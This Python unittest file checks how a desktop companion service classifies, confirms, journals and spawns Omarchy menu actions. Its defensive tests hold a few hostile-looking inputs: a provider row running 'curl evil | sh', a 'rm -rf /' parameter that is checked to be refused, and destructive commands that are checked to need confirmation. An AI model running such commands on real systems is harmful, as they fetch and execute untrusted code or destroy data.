"""MENU-4: every menu source row runs the way Omarchy's own menu runs it."""
from __future__ import annotations

import io
import json
import os
from pathlib import Path
import socket
import tempfile
import time
import unittest
from contextlib import redirect_stdout

from omodachi_core.catalog import compile_catalog
from omodachi_core.catalog_runtime import CatalogRuntime
from omodachi_core.graphical import GraphicalUnavailable
from omodachi_core.hub import Hub
from omodachi_core.menu_actions import (REASON_EMPTY, REASON_NEEDS_TERMINAL, ROUTE_ARGV0, classify,
                                        install_menu_action_adapter, menu_environment, spawn)
from omodachi_core.routes import RouteDescriptor
from omodachi_core.service import CoreService, ServiceError
from omodachi_core.shortcut_provider import validate_observation

FIXTURES = Path(__file__).resolve().parent / "fixtures"
#: Every action row of the host's menu that had no route adapter before
#: MENU-4: `id \t label \t action`, read from `omarchy`'s `/v1/catalog`
#: (Omarchy 4.0.4, core 7d55f72) on 2026-09-23. The five keybinding rows the
#: host publishes without a dispatcher are not in it; they are provider rows.
HOST_ROWS = [tuple(line.split("\t", 2)) for line in
             (FIXTURES / "omarchy-menu-actions.tsv").read_text().splitlines() if line]

WORKSPACE = {"id": 1, "name": "1", "monitor": "eDP-1"}
WINDOW = {"address": "0x56422918caa0", "class": "kitty", "title": "secret title",
          "fullscreen": 0, "floating": False, "workspace": {"id": 1, "name": "1"}}


class ClassificationTests(unittest.TestCase):
    """A-68 and §3, against the host's real rows."""

    def test_every_host_row_is_runnable(self):
        self.assertEqual(len(HOST_ROWS), 267)
        verdicts = {entry_id: classify(entry_id, action) for entry_id, _label, action in HOST_ROWS}
        self.assertEqual([entry_id for entry_id, verdict in verdicts.items() if not verdict["runnable"]], [])

    def test_the_confirm_table_on_the_host(self):
        reasons = {}
        for entry_id, _label, action in HOST_ROWS:
            verdict = classify(entry_id, action)
            if verdict["confirm"]:
                reasons.setdefault(verdict["confirm_reason"], []).append(entry_id)
        self.assertEqual(sorted(reasons["session"]), sorted(["system.lock", "system.suspend", "system.hibernate",
                                                             "system.logout", "system.reboot", "system.shutdown"]))
        self.assertEqual(len(reasons["erase"]), 51)  # 50 remove.* + setup.reset
        self.assertIn("setup.reset", reasons["erase"])
        self.assertEqual(len(reasons["update"]), 20)
        self.assertEqual(sorted(reasons["system"]), sorted([
            "trigger.hardware.hybrid-gpu", "setup.security.fingerprint", "setup.security.fido2",
            "setup.security.sshd", "setup.security.passwordless-sudo", "setup.security.sudoless-docker",
            "setup.direct-boot"]))
        self.assertEqual(sum(len(value) for value in reasons.values()), 84)

    def test_what_does_not_ask(self):
        rows = {entry_id: action for entry_id, _label, action in HOST_ROWS}
        for entry_id in ("about", "system.screensaver", "update.timezone", "update.process.hyprsunset",
                         "install.package", "install.development.go", "style.theme", "setup.keybindings",
                         "setup.config.hyprsunset", "trigger.capture.color", "learn.omarchy"):
            self.assertFalse(classify(entry_id, rows[entry_id])["confirm"], entry_id)

    def test_the_action_text_is_read_too_for_a_users_own_row(self):
        self.assertEqual(classify("my.sleep", "systemctl suspend")["confirm_reason"], "session")
        self.assertEqual(classify("my.bye", "loginctl terminate-user $USER")["confirm_reason"], "session")
        self.assertEqual(classify("my.rm", "sudo pacman -Rns foo")["confirm_reason"], "erase")
        self.assertEqual(classify("my.clean", "rm -rf ~/.cache/thing")["confirm_reason"], "erase")
        self.assertEqual(classify("my.up", "omarchy-launch-floating-terminal-with-presentation omarchy-update")
                         ["confirm_reason"], "system")
        self.assertFalse(classify("my.status", "systemctl status sshd")["confirm"])
        self.assertFalse(classify("my.wifi", "omarchy-launch-wifi")["confirm"])

    def test_a_row_that_needs_a_terminal_and_has_none_stays_grey(self):
        self.assertEqual(classify("my.pw", "passwd")["reason"], REASON_NEEDS_TERMINAL)
        self.assertEqual(classify("my.edit", "nvim ~/.bashrc")["reason"], REASON_NEEDS_TERMINAL)
        self.assertTrue(classify("update.password.user",
                                 "omarchy-launch-floating-terminal-with-presentation passwd")["runnable"])
        self.assertEqual(classify("my.blank", "   ")["reason"], REASON_EMPTY)
        self.assertEqual(classify("my.none", None)["reason"], REASON_EMPTY)


class Host:
    """One graphical session: two hyprctl queries and a record of spawns."""

    def __init__(self):
        self.spawned = []
        self.journal = []
        self.window = None
        self.exit_code = 0

    def runner(self, argv, env):
        if argv == ("/usr/bin/hyprctl", "-j", "activeworkspace"):
            return json.dumps(WORKSPACE)
        if argv == ("/usr/bin/hyprctl", "-j", "activewindow"):
            return json.dumps(self.window) if self.window else "{}"
        raise AssertionError(argv)

    def spawner(self, action, env, entry_id):
        self.spawned.append((entry_id, action, env.get("MARK")))
        self.window = WINDOW
        return {"pid": 4242, "exited": True, "exit_code": self.exit_code}


ROWS = {
    "about": {"label": "About", "action": "omarchy-launch-about"},
    "system": {"label": "System"},
    "system.shutdown": {"label": "Shutdown", "action": "omarchy-system-shutdown"},
    "system.screensaver": {"label": "Screensaver", "action": "omarchy-launch-screensaver force"},
    "remove": {"label": "Remove"},
    "remove.webapp": {"label": "Web App", "action": "omarchy-webapp-remove"},
    "trigger": {"label": "Trigger"},
    "trigger.toggle.reviewed": {"label": "Reviewed", "action": "omarchy-toggle-reviewed"},
    "trigger.mine": {"label": "Mine", "action": "passwd"},
    "apps": {"label": "Apps", "provider": "apps"},
}


class AdapterTests(unittest.TestCase):
    def service(self, rows=ROWS):
        self.host = Host()
        self.runtime = CatalogRuntime(compile_catalog(rows))
        service = CoreService(Hub(), runtime=self.runtime)
        # A reviewed adapter that owned its row before MENU-4 keeps it.
        self.reviewed = []
        service.policy.register("trigger.toggle.reviewed", RouteDescriptor("host", True, argv=("reviewed",)),
                                source_action="omarchy-toggle-reviewed")
        service.register_executor("trigger.toggle.reviewed", self.reviewed.append)
        self.adapter = install_menu_action_adapter(
            service, environment=lambda: {"MARK": "session", "HOME": "/home/fixture"},
            spawner=self.host.spawner, runner=self.host.runner, journal=self.host.journal.append,
            clock=lambda: 1789900000.0)
        return service

    def rows(self, service):
        return {row["id"]: row for row in service.refresh_catalog()["entries"]}

    def invoke(self, service, entry_id, request_id="r1", **extra):
        revision = service.refresh_catalog()["revision"]
        return service.invoke({"entry_id": entry_id, "request_id": request_id, "catalog_revision": revision,
                               **extra}, "ios-phone")

    def test_menu_rows_become_ready_host_routes(self):
        rows = self.rows(self.service())
        about = rows["about"]["route"]
        self.assertEqual(about, {"route": "host", "supported": True, "argv": [ROUTE_ARGV0, "about"],
                                 "entry_id": "about", "ready": True})
        self.assertNotIn("command", about)
        self.assertIs(rows["system.shutdown"]["route"]["confirm"], True)
        self.assertIs(rows["remove.webapp"]["route"]["confirm"], True)
        self.assertNotIn("confirm", rows["system.screensaver"]["route"])
        # A reviewed registration is never replaced.
        self.assertEqual(rows["trigger.toggle.reviewed"]["route"]["argv"], ["reviewed"])
        # §3: grey, with a reason the client can put into words.
        self.assertEqual(rows["trigger.mine"]["route"]["readiness_reason"], REASON_NEEDS_TERMINAL)
        self.assertIs(rows["trigger.mine"]["route"]["ready"], False)
        # A submenu is not an invocation, and says so.
        self.assertEqual(rows["system"]["route"]["reason"], "menu_row_not_invocable")
        self.assertNotIn("route adapter is not registered", json.dumps(list(rows.values())))

    def test_invoking_runs_the_rows_own_text_and_reports_what_the_host_did(self):
        service = self.service()
        result = self.invoke(service, "about")
        self.assertEqual(result["status"], "accepted")
        self.assertEqual(self.host.spawned, [("about", "omarchy-launch-about", "session")])
        observed = result["observed"]
        self.assertIs(validate_observation(observed), observed)
        self.assertEqual(observed["kind"], "exec")
        self.assertEqual(observed["process"], {"pid": 4242, "exited": True, "exit_code": 0})
        self.assertIsNone(observed["before"]["window"])
        self.assertEqual(observed["after"]["window"]["app_id"], "kitty")
        self.assertNotIn("title", json.dumps(observed))
        self.assertIs(observed["changed"], True)

    def test_the_journal_says_who_and_when_but_never_the_command(self):
        service = self.service()
        self.invoke(service, "system.shutdown")
        self.assertEqual(len(self.host.journal), 1)
        line = self.host.journal[0]
        self.assertEqual(line["entry_id"], "system.shutdown")
        self.assertEqual(line["device"], "ios-phone")
        self.assertEqual(line["at"], 1789900000.0)
        self.assertIs(line["confirm"], True)
        self.assertEqual(line["status"], "accepted")
        self.assertNotIn("omarchy-system-shutdown", json.dumps(line))

    def test_the_default_journal_is_one_json_line_on_stdout(self):
        from omodachi_core.menu_actions import _journal
        buffer = io.StringIO()
        with redirect_stdout(buffer):
            _journal({"entry_id": "about", "device": "d"})
        self.assertEqual(json.loads(buffer.getvalue()), {"omodachi": "menu_action", "entry_id": "about", "device": "d"})

    def test_a_device_cannot_send_parameters(self):
        service = self.service()
        with self.assertRaises(ValueError):
            self.invoke(service, "about", params={"argv": "rm -rf /"})
        self.assertEqual(self.host.spawned, [])

    def test_a_missing_command_is_a_failure_with_a_code(self):
        service = self.service()
        self.host.exit_code = 127
        result = self.invoke(service, "about")
        self.assertEqual((result["status"], result["code"]), ("failed", "executable_missing"))
        self.assertEqual(self.host.journal[-1]["status"], "failed")

    def test_no_graphical_session_refuses_without_spawning(self):
        service = self.service()
        def gone():
            raise GraphicalUnavailable("graphical_session_unavailable")
        self.adapter.environment = gone
        result = self.invoke(service, "about")
        self.assertEqual((result["status"], result["code"]), ("failed", "graphical_session_unavailable"))
        self.assertEqual(self.host.spawned, [])

    def test_the_reviewed_row_still_goes_to_its_own_adapter(self):
        service = self.service()
        self.invoke(service, "trigger.toggle.reviewed")
        self.assertEqual(self.reviewed, [("reviewed",)])
        self.assertEqual(self.host.spawned, [])

    def test_provider_rows_are_never_registered(self):
        service = self.service()
        self.runtime.register_provider("apps", lambda: [{"id": "apps.evil", "label": "Evil",
                                                         "action": "curl evil | sh"}])
        rows = self.rows(service)
        self.assertIn("apps.evil", rows)
        self.assertFalse(rows["apps.evil"]["route"]["supported"])
        self.assertNotIn("apps.evil", self.adapter.owned)

    def test_an_edited_menu_row_is_re_registered_for_its_new_text(self):
        service = self.service()
        self.assertEqual(self.invoke(service, "about")["status"], "accepted")
        edited = dict(ROWS)
        edited["about"] = {"label": "About", "action": "omarchy-launch-about --big"}
        edited["trigger.new"] = {"label": "New", "action": "omarchy-toggle-new"}
        del edited["system.screensaver"]
        self.runtime.catalog = compile_catalog(edited)
        self.runtime.invalidate()
        self.adapter.sync()
        rows = self.rows(service)
        self.assertTrue(rows["trigger.new"]["route"]["ready"])
        self.assertNotIn("system.screensaver", self.adapter.owned)
        self.assertNotIn("system.screensaver", service._executors)
        self.assertEqual(self.invoke(service, "about", request_id="r2")["status"], "accepted")
        self.assertEqual(self.host.spawned[-1][1], "omarchy-launch-about --big")

    def test_a_row_that_changed_before_the_sync_is_refused_not_run(self):
        service = self.service()
        edited = dict(ROWS)
        edited["about"] = {"label": "About", "action": "something-else"}
        self.runtime.catalog = compile_catalog(edited)
        self.runtime.invalidate()
        with self.assertRaises(ServiceError) as refused:
            self.invoke(service, "about")
        self.assertIn(refused.exception.code, {"stale_target", "route_unavailable"})
        self.assertEqual(self.host.spawned, [])

    def test_a_later_reviewed_registration_takes_the_row_over(self):
        service = self.service()
        service.policy.register("about", RouteDescriptor("host", True, argv=("about-adapter",)),
                                source_action="omarchy-launch-about")
        calls = []
        service.register_executor("about", calls.append)
        self.adapter.sync(force=True)
        self.assertNotIn("about", self.adapter.owned)
        self.invoke(service, "about")
        self.assertEqual(calls, [("about-adapter",)])
        self.assertEqual(self.host.spawned, [])

    def test_hidden_keybinding_rows_repeat_their_own_reason(self):
        from omodachi_core.routes import RoutePolicy
        row = {"id": "omodachi.shortcut.x", "action": "omodachi-keybinding omodachi.shortcut.x", "kind": "action",
               "shortcut": {"disabled_reason": "binding_adapter_unavailable"}}
        self.assertEqual(RoutePolicy().resolve(row).reason, "binding_adapter_unavailable")


class SpawnTests(unittest.TestCase):
    def env(self, home):
        return {"HOME": home, "PATH": "/usr/bin:/bin"}

    def test_a_finished_command_reports_its_exit(self):
        with tempfile.TemporaryDirectory() as home:
            # A generous window: a login shell on a loaded machine can take
            # longer than the 0.1 s the adapter waits, and this asks what the
            # receipt says once it has exited, not how fast.
            result = spawn("exit 7", self.env(home), "x", systemd_run="", settle=10)
        self.assertEqual((result["exited"], result["exit_code"]), (True, 7))

    def test_a_missing_command_is_127(self):
        with tempfile.TemporaryDirectory() as home:
            result = spawn("omodachi-definitely-not-a-command", self.env(home), "x", systemd_run="", settle=10)
        self.assertEqual(result["exit_code"], 127)

    def test_a_long_running_row_is_left_running_and_detached(self):
        with tempfile.TemporaryDirectory() as home:
            started = time.monotonic()
            result = spawn("sleep 2", self.env(home), "x", systemd_run="")
            self.assertLess(time.monotonic() - started, 0.5)
            self.assertFalse(result["exited"])
            self.assertEqual(os.getpgid(result["pid"]), result["pid"])
            os.kill(result["pid"], 9)

    def test_it_is_a_login_shell(self):
        with tempfile.TemporaryDirectory() as home:
            result = spawn("shopt -q login_shell", self.env(home), "x", systemd_run="", settle=10)
        self.assertEqual(result["exit_code"], 0)

    def test_the_scope_wraps_the_login_shell(self):
        with tempfile.TemporaryDirectory() as home:
            fake = Path(home) / "systemd-run"
            record = Path(home) / "argv"
            fake.write_text(f'#!/bin/bash\nprintf "%s\\n" "$@" > {record}\n')
            fake.chmod(0o755)
            spawn("omarchy-launch-about", self.env(home), "system.lock", systemd_run=str(fake))
            deadline = time.monotonic() + 2
            while not record.exists() and time.monotonic() < deadline:
                time.sleep(0.02)
            argv = record.read_text().splitlines()
        self.assertEqual(argv[:4], ["--user", "--scope", "--quiet", "--collect"])
        self.assertTrue(argv[5].startswith("omodachi-menu-system.lock-"))
        self.assertEqual(argv[6:], ["--", "/bin/bash", "-lc", "omarchy-launch-about"])


class EnvironmentTests(unittest.TestCase):
    SHELL_ENV = ("PATH=/usr/share/omarchy/bin:/usr/bin\0GDK_SCALE=2\0GUM_CONFIRM_PROMPT_FOREGROUND=#fff\0"
                 "HYPRLAND_INSTANCE_SIGNATURE=stale\0INVOCATION_ID=abc\0QS_NO_RELOAD_POPUP=1\0HOME=/home/fixture\0")
    COMPOSITOR_ENV = "PATH=/usr/bin\0HOME=/home/fixture\0XDG_SESSION_TYPE=wayland\0"

    def host(self, root, shells=()):
        proc, runtime = Path(root) / "proc", Path(root) / "run"
        signature = "efb50993_1789614994"
        instance = runtime / "hypr" / signature
        instance.mkdir(parents=True)
        for path in (instance / ".socket.sock", runtime / "wayland-1"):
            listener = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            listener.bind(str(path))
            self.addCleanup(listener.close)
        (instance / "hyprland.lock").write_text("1472\nwayland-1\n")
        compositor = proc / "1472"
        compositor.mkdir(parents=True)
        (compositor / "comm").write_text("Hyprland\n")
        (compositor / "environ").write_bytes(self.COMPOSITOR_ENV.encode())
        for index, argv in enumerate(shells):
            shell = proc / str(2000 + index)
            shell.mkdir()
            (shell / "comm").write_text("quickshell\n")
            (shell / "cmdline").write_bytes(argv)
            (shell / "environ").write_bytes(self.SHELL_ENV.encode())
        return proc, runtime

    def test_the_omarchy_shells_whole_environment(self):
        with tempfile.TemporaryDirectory() as root:
            proc, runtime = self.host(root, [b"quickshell\0-n\0-p\0/usr/share/omarchy/shell\0"])
            env = menu_environment(proc, runtime=runtime)
        self.assertEqual(env["GDK_SCALE"], "2")
        self.assertEqual(env["GUM_CONFIRM_PROMPT_FOREGROUND"], "#fff")
        # The live compositor's session wins over what the shell remembers.
        self.assertEqual(env["HYPRLAND_INSTANCE_SIGNATURE"], "efb50993_1789614994")
        self.assertEqual(env["WAYLAND_DISPLAY"], "wayland-1")
        self.assertNotIn("INVOCATION_ID", env)
        self.assertNotIn("QS_NO_RELOAD_POPUP", env)
        self.assertEqual(env["OMARCHY_PATH"], "/usr/share/omarchy")

    def test_a_relaunched_shell_is_still_the_shell(self):
        with tempfile.TemporaryDirectory() as root:
            proc, runtime = self.host(root, [b"/usr/bin/quickshell\0",
                                             b"quickshell\0-p\0/home/fixture/.config/omarchy/plugins/p/shell.qml\0"])
            env = menu_environment(proc, runtime=runtime)
        self.assertEqual(env["GDK_SCALE"], "2")

    def test_without_a_shell_the_compositors_environment(self):
        with tempfile.TemporaryDirectory() as root:
            proc, runtime = self.host(root)
            env = menu_environment(proc, runtime=runtime)
        self.assertEqual(env["XDG_SESSION_TYPE"], "wayland")
        self.assertIn("/usr/share/omarchy/bin", env["PATH"].split(":"))

    def test_without_a_compositor_there_is_no_environment(self):
        with tempfile.TemporaryDirectory() as root:
            (Path(root) / "proc").mkdir()
            (Path(root) / "run").mkdir()
            with self.assertRaises(GraphicalUnavailable):
                menu_environment(Path(root) / "proc", runtime=Path(root) / "run")


if __name__ == "__main__":
    unittest.main()
